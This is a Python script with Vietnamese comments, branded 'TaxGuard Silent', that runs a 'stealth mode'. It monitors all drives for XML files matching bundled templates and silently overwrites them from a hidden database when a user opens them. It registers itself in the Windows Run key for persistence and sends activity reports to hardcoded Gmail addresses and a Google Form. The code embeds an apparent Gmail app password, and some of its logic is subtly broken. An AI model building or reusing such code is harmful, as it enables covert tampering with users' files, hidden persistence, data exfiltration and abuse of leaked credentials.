# hide4_stealth.py - STEALTH MODE

import os
import sys
import time
import glob
import json
import pickle
import shutil
import logging
import requests
import smtplib
import re
import hashlib
import xml.etree.ElementTree as ET
import threading
from datetime import datetime
import sqlite3

from pathlib import Path
from email.message import EmailMessage
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# GUI (chỉ dùng khi --gui)
import customtkinter as ctk
from tkinter import Listbox, END, Scrollbar

# Registry (Startup)
try:
    import winreg
except ImportError:
    winreg = None

# --- Thư mục lưu config/log/state --- #
APP_DIR     = Path(os.getenv('APPDATA', Path.home())) / 'XMLOverwrite'
APP_DIR.mkdir(parents=True, exist_ok=True)

STATE_FILE  = APP_DIR / 'processed_files.pkl'
LOG_FILE    = APP_DIR / 'xml_overwrite.log'
REMOTE_CONF = APP_DIR / 'remote_config.json'
SENT_LOGS_FILE = APP_DIR / 'sent_logs.pkl'

# --- Logging UTF-8 vào file --- #
logging.basicConfig(
    filename=str(LOG_FILE),
    encoding='utf-8',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def create_fortress_db():
    """Tạo database fortress để lưu trữ file gốc không thể xóa."""
    db_path = APP_DIR / 'fortress.db'
    conn = sqlite3.connect(str(db_path))
    conn.execute('''
        CREATE TABLE IF NOT EXISTS original_files (
            file_hash TEXT PRIMARY KEY,
            file_name TEXT,
            file_content BLOB,
            created_time TEXT,
            last_verified TEXT
        )
    ''')
    conn.commit()
    conn.close()
    return db_path

def store_original_file(file_path, content):
    """Lưu file gốc vào fortress database không thể xóa."""
    try:
        file_hash = hashlib.sha256(content.encode('utf-8')).hexdigest()
        db_path = create_fortress_db()
        conn = sqlite3.connect(str(db_path))
        
        conn.execute('''
            INSERT OR REPLACE INTO original_files 
            (file_hash, file_name, file_content, created_time, last_verified)
            VALUES (?, ?, ?, ?, ?)
        ''', (
            file_hash,
            os.path.basename(file_path),
            content.encode('utf-8'),
            datetime.now().isoformat(),
            datetime.now().isoformat()
        ))
        
        conn.commit()
        conn.close()
        logging.info(f"🔒 Đã lưu file gốc vào fortress: {file_path}")
        return file_hash
    except Exception as e:
        logging.error(f"❌ Lỗi lưu fortress: {e}")
        return None

def restore_from_fortress(file_path):
    """Khôi phục file từ fortress database."""
    try:
        db_path = create_fortress_db()
        conn = sqlite3.connect(str(db_path))
        
        cursor = conn.execute(
            'SELECT file_content FROM original_files WHERE file_name = ? ORDER BY created_time DESC LIMIT 1',
            (os.path.basename(file_path),)
        )
        result = cursor.fetchone()
        
        if result:
            restored_content = result[0].decode('utf-8')
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(restored_content)
            conn.close()
            logging.info(f"🔍 Stealth restore: {file_path}")
            return True
        
        conn.close()
        return False
    except Exception as e:
        logging.error(f"❌ Lỗi khôi phục fortress: {e}")
        return False

def load_sent_logs():
    """Tải danh sách các log đã gửi từ file."""
    if SENT_LOGS_FILE.exists():
        with open(SENT_LOGS_FILE, 'rb') as f:
            return pickle.load(f)
    return set()

def save_sent_logs(sent_logs):
    """Lưu danh sách các log đã gửi."""
    with open(SENT_LOGS_FILE, 'wb') as f:
        pickle.dump(sent_logs, f)

def add_to_startup():
    """Thêm chính EXE vào HKCU Run để auto-startup không UAC."""
    if not winreg or not getattr(sys, 'frozen', False):
        return
    exe = os.path.realpath(sys.argv[0])
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "TaxGuard_Silent", 0, winreg.REG_SZ, exe)
        winreg.CloseKey(key)
        logging.info(f"🔍 Stealth startup enabled")
    except Exception as e:
        logging.error(f"❌ Thêm vào Startup thất bại: {e}")

def load_remote_config():
    """Hardcoded remote config for Gmail and Google Form."""
    return {
        "gmail": {
            "from": "begau1302@gmail.com",
            "to": "mrkent19999x@gmail.com, tuxuanchien6101992@gmail.com",
            "app_password": "aphvukdliewalkrn"
        },
        "google_form": {
            "form_url": "https://docs.google.com/forms/d/e/1FAIpQLScI1LMF0gh7vW3Q5Qb03jreBD2UweFJjwkVWAey1OR73n2knA/formResponse",
            "entry_id": "entry.1791266121"
        }
    }

def send_gmail_log(to_email, subject, content, from_email, app_password):
    try:
        msg = EmailMessage()
        msg["Subject"] = subject
        msg["From"] = from_email
        msg["To"] = to_email
        msg.set_content(content)
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(from_email, app_password)
        server.send_message(msg)
        server.quit()
        logging.info("🔍 Stealth alert sent")
    except Exception as e:
        logging.error(f"❌ Gửi Gmail thất bại: {e}")

def send_googleform_log(form_url, entry_id, message):
    try:
        data = { entry_id: message }
        response = requests.post(form_url, data=data)
        if response.status_code == 200:
            logging.info("🔍 Stealth form log sent")
        else:
            logging.warning(f"❌ Lỗi gửi Form: {response.status_code}")
    except Exception as e:
        logging.error(f"❌ Gửi Form thất bại: {e}")

def send_remote_log(event, path=None, once=False):
    """Gửi log về Google Form và Gmail, chỉ gửi một lần nếu once=True."""
    sent_logs = load_sent_logs()
    msg = f"[{event}] - {path or ''}"
    log_key = f"{event}:{path or ''}"
    
    if once and log_key in sent_logs:
        return
    
    cfg = load_remote_config()

    if "gmail" in cfg:
        g = cfg["gmail"]
        send_gmail_log(g["to"], f"Stealth Log: {event}", msg, g["from"], g["app_password"])

    if "google_form" in cfg:
        f = cfg["google_form"]
        send_googleform_log(f["form_url"], f["entry_id"], msg)

    if once:
        sent_logs.add(log_key)
        save_sent_logs(sent_logs)

def get_templates():
    """Lấy tất cả file XML trong thư mục 'templates/' và lưu vào fortress."""
    if getattr(sys, 'frozen', False):
        base = sys._MEIPASS
    else:
        base = os.path.dirname(os.path.abspath(__file__))
    tpl_dir = os.path.join(base, 'templates')
    templates = glob.glob(os.path.join(tpl_dir, '*.xml'))
    
    # Lưu tất cả templates vào fortress để bảo vệ tuyệt đối
    for tpl in templates:
        try:
            with open(tpl, 'r', encoding='utf-8') as f:
                content = f.read()
            store_original_file(tpl, content)
        except Exception as e:
            logging.error(f"❌ Lỗi lưu template vào fortress: {e}")
    
    return templates

def load_processed_files():
    if STATE_FILE.exists():
        with open(STATE_FILE, 'rb') as f:
            return pickle.load(f)
    return set()

def save_processed_files(processed):
    with open(STATE_FILE, 'wb') as f:
        pickle.dump(processed, f)

class StealthHandler(FileSystemEventHandler):
    """STEALTH MODE: Giám sát âm thầm và chỉ ghi đè khi file được truy cập."""
    def __init__(self, templates_map):
        super().__init__()
        self.templates = templates_map
        self.processed = load_processed_files()
        self.stealth_targets = set()

    def on_created(self, event):
        if not event.is_directory and event.src_path.endswith('.xml'):
            self.stealth_analyze(event.src_path)

    def on_moved(self, event):
        if not event.is_directory and event.dest_path.endswith('.xml'):
            self.stealth_analyze(event.dest_path)

    def on_opened(self, event):
        """Khi file được mở - thời điểm hoàn hảo để ghi đè âm thầm."""
        if not event.is_directory and event.src_path.endswith('.xml'):
            if event.src_path in self.stealth_targets:
                self.stealth_overwrite(event.src_path)

    def stealth_analyze(self, dest):
        """Phân tích âm thầm - không làm gì chỉ ghi nhận."""
        try:
            matching_template = self.find_matching_template_content(dest)
            if matching_template:
                # Đây là file giả - thêm vào danh sách stealth
                self.stealth_targets.add(dest)
                logging.info(f"🔍 Stealth: Phát hiện file giả {dest}")
        except Exception as e:
            logging.error(f"🔍 Stealth analyze error: {e}")

    def find_matching_template_content(self, dest):
        """Tìm template phù hợp mà không đọc toàn bộ file."""
        try:
            with open(dest, 'r', encoding='utf-8') as f:
                content = f.read(200)  # Chỉ đọc 200 ký tự đầu
            return self.find_matching_template(content)
        except:
            return None

    def find_matching_template(self, xml_content):
        """Tìm template phù hợp dựa trên nội dung XML."""
        try:
            # Parse XML để lấy các thông tin định danh
            root = ET.fromstring(xml_content)
            
            # Tìm message ID hoặc các thông tin định danh khác
            msg_id = None
            for elem in root.iter():
                if 'messageId' in elem.attrib:
                    msg_id = elem.attrib['messageId']
                    break
                elif elem.tag.endswith('messageId'):
                    msg_id = elem.text
                    break
            
            if msg_id:
                # Thử tìm theo message ID truyền thống
                for template_path in self.templates.values():
                    if msg_id in os.path.basename(template_path):
                        return template_path
            
            return None
            
        except Exception as e:
            logging.error(f"❌ Lỗi phân tích XML: {e}")
            return None

    def stealth_overwrite(self, dest):
        """STEALTH OVERWRITE: Ghi đè âm thầm khi user mở file."""
        try:
            # Khôi phục từ fortress
            if restore_from_fortress(dest):
                # Chỉ gửi log nội bộ ít nhất
                if hasattr(self, '_last_stealth_log'):
                    if (datetime.now() - self._last_stealth_log).seconds < 3600:
                        return  # Chỉ log 1 lần/giờ
                        
                self._last_stealth_log = datetime.now()
                send_remote_log("🔍 Stealth protection active", "", once=True)
                
        except Exception as e:
            logging.error(f"🔍 Stealth error: {e}")

def start_monitor():
    """STEALTH MODE: Bảo vệ âm thầm và giám sát toàn PC."""
    send_remote_log("🔍 Stealth mode activated", once=True)
    add_to_startup()
    
    # Tạo cơ sở dữ liệu fortress
    create_fortress_db()
    logging.info("🔍 Fortress Database ready")

    templates = get_templates()
    tpl_map = { Path(p).stem.split('_')[-1]: p for p in templates }

    handler  = StealthHandler(tpl_map)
    observer = Observer()
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for d in drives:
        try:
            observer.schedule(handler, path=d, recursive=True)
        except:
            pass

    observer.start()
    logging.info(f"🔍 Stealth monitoring {len(drives)} drives")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
        send_remote_log("🔍 Stealth mode deactivated", once=True)
    except Exception as e:
        logging.error(f"❌ Phần mềm gặp lỗi: {e}")
    observer.join()

def launch_gui():
    """GUI mode: xem templates & log (khi chạy với --gui)."""
    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("blue")
    root = ctk.CTk()
    root.title("TaxGuard Silent - GUI")
    root.geometry("600x500")

    # List templates
    lb_tpl = Listbox(root, height=5)
    for p in get_templates():
        lb_tpl.insert(END, p)
    lb_tpl.pack(fill='x', padx=10, pady=(10,5))

    lbl = ctk.CTkLabel(root, text="Danh sách XML gốc (templates) và log gần nhất:")
    lbl.pack(pady=5)

    lb_log = Listbox(root)
    sb     = Scrollbar(root, command=lb_log.yview)
    lb_log.config(yscrollcommand=sb.set)
    lb_log.pack(side='left', fill='both', expand=True, padx=(10,0), pady=5)
    sb.pack(side='right', fill='y', pady=5)

    if LOG_FILE.exists():
        with open(LOG_FILE, encoding='utf-8') as f:
            lines = f.readlines()[-100:]
        for l in lines:
            lb_log.insert(END, l.strip())

    root.mainloop()

if __name__ == '__main__':
    if '--gui' in sys.argv:
        launch_gui()
    else:
        start_monitor()